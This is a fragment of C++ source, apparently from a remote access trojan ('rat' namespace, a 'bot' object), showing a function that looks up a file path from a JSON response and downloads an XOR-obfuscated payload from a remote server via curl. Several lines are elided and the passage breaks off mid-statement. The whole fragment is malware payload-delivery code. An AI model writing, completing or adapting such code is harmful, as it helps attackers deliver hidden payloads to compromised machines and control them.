...
Handler::downloadXoredPayload(const std::string &File_Url) {
	::rat::networking::NetworkingResult result = {CURLE_OK, 0};

	auto &curl_client = this->bot->curl_client;

	const std::string &downloading_file_url_schema =
	    this->bot->getDownloadingFileUrl();
	...
	std::string real_url_with_file_path = "";
	{
		...
		auto http_response_result = curl_client.sendHttpRequest(
		    File_Url.c_str(), http_response_buffer.data(),
		    http_response_buffer.size());
			if(http_response_result.curl_code != CURLE_OK) {
				HANDLER_ERROR_LOG(
				    "FAILED at retrieving the http response, the json file "
				    "containing the actual path of the file");
				return http_response_result;
			}
		std::string json_raw(http_response_buffer.begin(),
		                     http_response_buffer.begin() +
		                         http_response_result.size);
		simdjson::padded_string padded_json(json_raw);
			...
			try {
				...
				real_url_with_file_path = fmt::format(
				    "{}/{}", downloading_file_url_schema, file_path);
			}
			catch(const simdjson::simdjson_error &e) {
				HANDLER_ERROR_LOG("downloadFile JSON parsing failed: {}",
				                  e.what());
				http_response_result.curl_code = CURLE_RECV_ERROR;
				return http_response_result;
			}
	}
	::rat::networking::XorDataContext xor_data_context = {&xor_key, 0,
	                                                      &payload_buffer};
		if((result.curl_code = curl_client.setUrl(real_url_with_file_path)) !=
		       CURLE_OK ||
		   (result.curl_code = curl_client.setWriteCallBackFunction(
		        &::rat::networking::_cbVectorXoredDataWrite)) != CURLE_OK ||
		   (result.curl_code = curl_client.setOption(
		        CURLOPT_WRITEDATA, static_cast<void *>(&xor_data_context))) !=
		       CURLE_OK ||
		   (result.curl_code = curl_client.setOption(CURLOPT_SSL_VERIFYPEER,
		                                             1L)) != CURLE_OK ||
		   (result.curl_code = curl_client.setOption(CURLOPT_SSL_VERIFYHOST,
		                                             2L)) != CURLE_OK ||
		   (result.curl_code = curl_client.setOption(CURLOPT_FOLLOWLOCATION,
		                                             1L)) != CURLE_OK ||
		   (result.curl_code = curl_client.setOption(CURLOPT_TIMEOUT, 60L)) !=
		       CURLE_OK ||
		   (result.curl_code = curl_client.setOption(CURLOPT_CONNECTTIMEOUT,
		                                             5L)) != CURLE_OK) {
